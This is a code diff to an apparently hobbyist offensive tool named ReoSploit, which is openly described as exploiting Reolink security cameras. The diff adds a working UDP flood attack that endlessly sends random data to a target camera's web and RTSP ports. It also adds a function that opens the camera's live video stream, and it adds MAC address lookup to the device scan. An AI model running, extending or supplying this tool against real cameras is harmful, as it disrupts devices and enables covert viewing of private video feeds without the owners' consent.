@@ -5,16 +5,21 @@ import sys
 import os
 from colorama import Fore, init, Back, Style
 init()
+import socket
+import random
 import netaddr
 import pyshark
 import argparse
 import threading
 from queue import Queue
+import time
+import cv2
+from scapy.all import *
 def setargs():
 	global args
 	parser = argparse.ArgumentParser(description='Exploit the shitty web security of Reolink Cameras.')
 	parser.add_argument('ip', help="IP of Target Reolink Camera", type=str)
-	parser.add_argument('action', choices=['scan', 'listen', 'token', 'enumerate', 'snap'], help='''Action to do. (Scan: Scan your network for ReoLink Devices) (Listen: Listen for Connections to and from the Camera) (Token: Generate an Authentication Token with a Username and Password) (Enumerate: Enumerates information about the Camera) (Snap: Snaps a photo from the camera using a Token)''')
+	parser.add_argument('action', choices=['scan', 'listen', 'token', 'enumerate', 'snap', 'dos', 'stream'], help='''Action to do. (Scan: Scan your network for ReoLink Devices) (Listen: Listen for Connections to and from the Camera) (Token: Generate an Authentication Token with a Username and Password) (Enumerate: Enumerates information about the Camera) (Snap: Snaps a photo from the camera using a Token) (Dos: DOS the Target Device and Slow it down, including slowing down the Webpage and Video.) (Stream: Get a Live Stream from the Camera's Video Feed.)''')
 	parser.add_argument('-u', help="Username to Authenticate on Camera", type=str)
 	parser.add_argument('-p', help="Password to Authenticate on Camera", type=str)
 	parser.add_argument('-i', help="Network iFace to use if listening.", type=str)
@@ -30,7 +35,8 @@ def scan():
 		try:
 			r = requests.get('http://' + str(ip))
 			if "<title id=appTitle>Reolink</title>" in r.text:
-				info("Found Reolink Device: " + str(ip))
+				mac = getmacbyip(str(ip))
+				info("Found Reolink Device: " + str(ip) + " -- " + mac)
 			else:
 				pass
 		except requests.exceptions.ConnectionError:
@@ -179,6 +185,52 @@ def snap():
 	else:
 		info('Unknown Status Code, presuming the Snapshot failed...')
 
+def dos():
+	print(Style.BRIGHT + Fore.YELLOW + "WARNING:" + Style.RESET_ALL + " THIS ATTACK WILL SLOW DOWN THE CAMERA AND BE VERY OBVIOUS, PLEASE TAKE CAUTION!")
+	info("Preparing for DOS...")
+	ip = args.ip
+	ports = [80, 443, 554]
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	info("Making Bogus Data...")
+	bogusdata = random._urandom(64900)
+	info("Starting DOS In 5 Seconds...")
+	time.sleep(5)
+	sent = 0
+	print("Press CNTRL + C At Anytime to Stop the Attack.")
+	try:
+		while True:
+			print("Sending Bogus Data to Ports On " + ip + "...")
+			print("----------------------")
+			for port in ports:
+				s.sendto(bogusdata, (ip,port))
+				sent += 1
+				print("Sent Bogus Data -> " + str(port))
+			print("\nSent " + Style.BRIGHT + str(sent) + Style.RESET_ALL + " Packets")
+			print("----------------------\n")
+	except KeyboardInterrupt:
+		info("Stopping...")
+		sys.exit()
+
+def stream():
+	if not args.u or not args.p:
+		info('A Username & Password for Authentication is Required for Streaming Video!')
+		sys.exit()
+	info("Attempting to Stream Through RTSP...")
+	print("Press CNTRL + C At Anytime to Stop the Stream.")
+	cap = cv2.VideoCapture(f"rtsp://{args.u}:{args.p}@{args.ip}")
+	try:
+		while(cap.isOpened()):
+			ret, frame = cap.read()
+			frame = cv2.resize(frame, (900, 900))
+			cv2.imshow(f'ReoSploit Stream @ {args.ip}', frame)
+			if cv2.waitKey(20) & 0xFF == ord('q'):
+				break
+	except KeyboardInterrupt:
+		pass
+	cap.release()
+	cv2.destroyAllWindows()
+
+
 if os.geteuid() != 0:
 	info('Please run this as ROOT!')
 	sys.exit()
@@ -194,7 +246,7 @@ banner = fr'''
 {Fore.BLUE}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
 {Fore.BLUE}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║   
 {Fore.BLUE}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
-{green}SpiceSouls - Beyond Root Sec - V1.0.0
+{green}SpiceSouls - Beyond Root Sec - V1.1.0
 {Fore.RESET}{Style.RESET_ALL}'''
 
 print(banner)
@@ -235,6 +287,10 @@ try:
 		enumerate()
 	elif args.action == 'snap':
 		snap()
+	elif args.action == 'dos':
+		dos()
+	elif args.action == 'stream':
+		stream()
 except KeyboardInterrupt:
 	print("\nQuitting...")
 	sys.exit()
